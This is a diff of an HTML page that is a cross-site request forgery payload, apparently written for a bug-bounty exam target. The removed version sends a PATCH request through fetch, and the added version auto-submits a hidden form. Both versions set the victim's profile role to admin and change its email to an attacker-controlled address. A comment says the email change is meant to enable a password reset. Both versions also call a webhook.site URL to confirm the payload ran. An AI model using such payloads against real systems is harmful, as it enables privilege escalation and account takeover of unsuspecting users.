@@ -1,22 +1,18 @@
 <html>
   <body>
+    <h1>Processing...</h1>
+    <form id="pwn" action="https://api-bugbounty-exam.hashacademy.co/api/auth/profile" method="POST">
+      <input type="hidden" name="role" value="admin" />
+      <input type="hidden" name="fullName" value="Pwned_By_Saja" />
+      <input type="hidden" name="email" value="rundlady@gongjua.com" />
+    </form>
+
     <script>
-      fetch("https://api-bugbounty-exam.hashacademy.co/api/auth/profile", {
-        method: "PATCH",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        // We add the 'role' field here to try and escalate to admin
-        // or change the email to one we control to trigger a password reset
-        body: JSON.stringify({
-          "fullName": "Pwned_Admin",
-          "email": "rundlady@gongjua.com", 
-          "role": "admin" 
-        })
-      }).then(response => {
-        // Redirect to your webhook so you know the bot executed it
-        window.location = "https://webhook.site/107adc74-8f86-4c01-95dd-647268c9c6a8?status=pwned";
-      });
+      // This ensures the bot triggers the webhook so you know it worked
+      fetch('https://webhook.site/107adc74-8f86-4c01-95dd-647268c9c6a8?status=triggered');
+      
+      // Submit the form automatically
+      document.getElementById('pwn').submit();
     </script>
   </body>
 </html>
